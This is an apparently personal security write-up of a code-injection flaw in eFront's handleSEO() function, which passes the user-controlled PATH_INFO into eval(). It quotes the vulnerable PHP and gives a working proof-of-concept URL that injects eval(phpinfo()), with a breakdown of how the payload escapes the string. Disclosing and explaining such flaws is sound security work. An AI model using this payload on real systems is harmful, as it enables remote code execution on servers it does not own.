
The reason I have been away from the internet is because of the internet blockage in Ethiopia caused by the State of Emergency & its consequences facing you if you don&#039;t follow it, I am currently in a neighboring country so I am not technically disrespecting any laws.

In /efront/libraries/globals.php:

The following handleSEO() function is the one causing the code execution. it looks like the following:

function handleSEO() {
if (!$GLOBALS[&#039;configuration&#039;][&#039;seo&#039;] && $_SERVER[&#039;PATH_INFO&#039;]) {
$parts = explode("/", trim($_SERVER[&#039;PATH_INFO&#039;], "/"));
for ($i = 0; $i < sizeof($parts); $i+=2) {
eval(&#039;$&#039;.$parts[$i].&#039; = "&#039;.$parts[$i+1].&#039;";&#039;);
}
//unset($parts);unset($i);
foreach (get_defined_vars() as $key => $value) {
$_GET[$key] = $value;
}
}
}

Because of their assumption that $_SERVER[&#039;PATH_INFO&#039;] isn&#039;t user controllable, they sent it stright to eval(), causing the code execution.

Final PoC: https://localhost/efonrt/libraries/globals.php/hack/x%22%3Beval(phpinfo())%3B%24t%3D%22pwnd
Decoded:
https://localhost/efonrt/libraries/globals.php/hack/x";eval(phpinfo());$t="pwnd
visiting the above link will get phpinfo() executed.

Breaking it down:
$parts = explode("/", trim($_SERVER[&#039;PATH_INFO&#039;], "/"));
for ($i = 0; $i < sizeof($parts); $i+=2) {
eval(&#039;$&#039;.$parts[$i].&#039; = "&#039;.$parts[$i+1].&#039;";&#039;);
}

Because of that specific code, we send in /globals.php/hack/x, which will become:
$hack="x

But because php already executed the code, doing a comment (/*..*/) wont work and will crash it, so we will just tamper the variables like x";eval(phpinfo());$t="pwnd

This will endup creating:

$hack = "x";eval(phpinfo());$t="pwnd";


eval($hack = "x";eval(phpinfo());$t="pwnd";);

And Boom! We got our code executed!

Hope you enjoyed the read!

